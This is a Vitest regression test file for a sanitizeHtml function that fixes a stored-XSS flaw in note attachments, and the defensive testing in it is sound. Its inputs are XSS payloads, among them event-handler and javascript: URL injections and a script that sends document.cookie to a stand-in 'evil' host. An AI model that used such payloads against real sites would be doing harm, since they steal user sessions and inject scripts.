// @vitest-environment happy-dom
// B2 regression tests — the stored-XSS fix for note HTML attachments.
// These must fail if anyone re-introduces raw innerHTML rendering.
import { describe, it, expect } from "vitest";
import { sanitizeHtml } from "./sanitize-html";

describe("sanitizeHtml (B2 XSS fix)", () => {
  it("strips <script> tags and their content entirely", () => {
    const out = sanitizeHtml('<p>safe</p><script>alert("x")</script>');
    expect(out).toContain("safe");
    expect(out).not.toContain("script");
    expect(out).not.toContain("alert");
  });

  it("strips event-handler attributes", () => {
    const out = sanitizeHtml('<img src="https://x/y.png" onerror="alert(1)">');
    expect(out).not.toContain("onerror");
    expect(out).not.toContain("alert(1)");
    expect(out).toContain("y.png"); // benign src survives
  });

  it("neutralizes javascript: and data:text/html URLs", () => {
    const out = sanitizeHtml('<a href="javascript:alert(1)">x</a><a href="data:text/html,<script>1</script>">y</a>');
    expect(out).not.toContain("javascript:");
    expect(out).not.toContain("data:text/html");
  });

  it("strips inline style attributes (CSS exfil vector)", () => {
    const out = sanitizeHtml('<div style="background:url(https://evil/x)">t</div>');
    expect(out).not.toContain("style=");
    expect(out).not.toContain("evil");
  });

  it("removes iframe/object/embed/svg with subtree", () => {
    const out = sanitizeHtml('<iframe src="https://evil"></iframe><object data="x"></object><embed src="x"><svg onload="alert(1)"><circle/></svg><p>keep</p>');
    expect(out).not.toContain("iframe");
    expect(out).not.toContain("object");
    expect(out).not.toContain("embed");
    expect(out).not.toContain("svg");
    expect(out).toContain("keep");
  });

  it("keeps benign markup intact", () => {
    const html = '<div class="x"><p><b>bold</b> and <em>em</em></p><ul><li>a</li><li>b</li></ul><table><tr><td>c</td></tr></table></div>';
    const out = sanitizeHtml(html);
    expect(out).toContain("<b>bold</b>");
    expect(out).toContain("<em>em</em>");
    expect(out).toContain("<li>a</li>");
    expect(out).toContain("<td>c</td>");
  });

  it("unwraps unknown tags but keeps their text", () => {
    const out = sanitizeHtml("<weird-tag>hello</weird-tag>");
    expect(out).toContain("hello");
    expect(out).not.toContain("weird-tag");
  });

  it("forces target=_blank + rel=noopener on links", () => {
    const out = sanitizeHtml('<a href="https://example.com">e</a>');
    expect(out).toContain('rel="noopener noreferrer nofollow"');
    expect(out).toContain('target="_blank"');
  });

  it("allows inline raster images, blocks other data: URLs", () => {
    const out = sanitizeHtml('<img src="data:image/png;base64,AAA">');
    expect(out).toContain("data:image/png");
    const bad = sanitizeHtml('<img src="data:text/html;base64,AAA">');
    expect(bad).not.toContain("data:text/html");
  });

  it("strips HTML comments", () => {
    const out = sanitizeHtml("<!-- [if IE]><script>alert(1)</script><![endif] --><p>t</p>");
    expect(out).not.toContain("<!--");
    expect(out).not.toContain("alert");
    expect(out).toContain("t");
  });

  it("returns inert text for a script-only payload", () => {
    const out = sanitizeHtml("<script>fetch('https://evil/'+document.cookie)</script>");
    expect(out).not.toContain("script");
    expect(out).not.toContain("fetch");
    expect(out).not.toContain("document.cookie");
  });
});
